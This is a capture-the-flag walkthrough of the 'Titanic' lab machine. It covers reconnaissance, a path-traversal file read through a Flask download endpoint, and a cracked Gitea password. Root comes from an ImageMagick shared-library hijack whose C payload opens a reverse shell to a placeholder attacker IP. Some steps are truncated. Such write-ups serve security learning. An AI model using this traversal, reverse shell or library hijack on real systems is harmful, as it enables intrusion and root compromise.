# Titanic Walthrough

## Recon

We start to find open port with 2 are opened:  

nmap -p- --min-rate 10000 10.129.231.221
 
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
  
Then check those ports

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)  
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)  
80/tcp open  http    Apache httpd 2.4.52  
|_http-server-header: Apache/2.4.52 (Ubuntu)  
|_http-title: Did not follow redirect to http://titanic.htb/  
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  

So checking the version of open SSH and apche, the host is running Ubuntu 22.04 jammy

Then I check subdomain with fuzz

ffuf -u http://10.129.231.221 -H "Host: FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

-ac meaning autocalibrates to eliminate false positives

I got 

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 46ms]

So then I will add both to /etc/hosts so I can interact

10.129.231.221 titanic.htb dev.titanic.htb

Using echo "10.129.231.221 titanic.htb dev.titanic.htb" | sudo tee -a /etc/hosts 

where tee -a: Appends the input to the file without overwriting existing content. 

Then I fill out the form and submit. It automatically downloads json file

I also use Wappalyzer to identify the framework

Let's try some directory brute force 

feroxbuster -u http://titanic.htb

=> Nothing interested

Note: The /book endpoint returns 405 because it only accepts POST requests.

Then I go to http://dev.titanic.htb/ is hosting an instance of Gitea

Clicking Explore, there are two public repos:

The docker-config repo has two folders and a README.md:

The README.md isn’t very interesting. Each of the folders have a docker-compose.yml file. The Gitea one shows a path where the Gitea data lives on the host and in the container:

gitea have 
gitea:  
    image: gitea/gitea  
    container_name: gitea  
    ports:  
      - "127.0.0.1:3000:3000"  
      - "127.0.0.1:2222:22"  # Optional for SSH access  
    volumes:  
      - /home/developer/gitea/data:/data # Replace with your path  
    environment:  
      - USER_UID=1000  
      - USER_GID=1000  

The MySQl one has a password  
 image: mysql:8.0   
    container_name: mysql  
    ports:  
      - "127.0.0.1:3306:3306"  
    environment:  
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'  
      MYSQL_DATABASE: tickets   
      MYSQL_USER: sql_svc  
      MYSQL_PASSWORD: sql_password  

The flask-app repo has the source code for titanic.htb

The only interesting is app.py, which shows all the routes. / returns the static page:

@app.route('/')  
def index():  
    return render_template('index.html')  

/book takes a POST request and saves the data to a file with a random UUID filename, and then returns a redirect to /download with that filename:

/download passes a constant TICKETS_DIR (which is set to “tickets” at the top of the file) and the user input parameter to os.path.join, and then checks if that resulting file exists and sends it:

### Shell as Developer

When I submit a booking request to /book, it returns a 302 redirect to /download:

This could be potential directory traversal file read vulnerabilities

I tried to change ticket value to /etc/passwd

And it passes my input to os.path.join, I can exploit the way this behaves.

I am going to try curl 'http://titanic.htb/download?ticket=/etc/ad'  
{"error":"Ticket not found"} 

If the filepath is a file, it returns that file curl 'http://titanic.htb/download?ticket=/etc/hostname'

### User Flag

I change GET /download?ticket=/home/developer/user.txt in burp

292bc3cf900c9c3a9f0a631384335825

I’ll download the DB using curl :

curl "http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db

Then I sqlite3 gitea.db

Insqlite3 i do select name,passwd,salt,passwd_hash_algo from user;

It cracks developers to be “25282528”.

Then I ssh developer@titanic.htb 

### Shell as root

developer@titanic:~$ ls -la

The processes on the system are only visible to the current user and root users: 

developer@titanic:~$ ps auxww

The ps auxwww command in Linux is used to display a snapshot of all running processes on the system


/proc is mounted with the hidepid option set to invisible:

developer@titanic:~$ mount | grep "/proc "  
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)  


Let's check opt folder  
developer@titanic:~$ ls /opt/  
app  containerd  scripts  

app contains the same stuff already analyzed in Gitea.

developer doesn’t have read access into containerd.

scripts contains a single .sh script:

developer@titanic:/opt/scripts$ cat identify_images.sh   
cd /opt/app/static/assets/images  
truncate -s 0 metadata.log  
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log  

developer has write access to the images folder, so it’s worth looking at what I might exploit here. The obvious target in that script is Image Magick. The version on Titanic is 7.1.1-35

developer@titanic:/opt/app/static/assets/images$ magick -version

Then i google imagemaick 7.1.1-35 cve

So then I do 

developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF  

ls -l /tmp

-rwsrwsrwx 1 root      root      1396520 Mar  2 20:06 ad

developer@titanic:/opt/app/static/assets/images$ /tmp/ad -p  
ad-5.1# cat /root/root.txt  
423dfec23fdd82b5d4eef886070da611  

Or we can try and make sure have nc -nlvp 8888

### developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF 
### #include <stdio.h> 
### #include <stdlib.h> 
### #include <unistd.h> 
### __attribute__((constructor)) void init(){ 
###        system("bash -c 'bash -i >& /dev/tcp/[ATTACKERIP]/8888 0>&1'"); 
###        exit(0); 
### } 
### EOF

root@titanic:~# cat root.txt  
cat root.txt   
423dfec23fdd82b5d4eef886070da611  
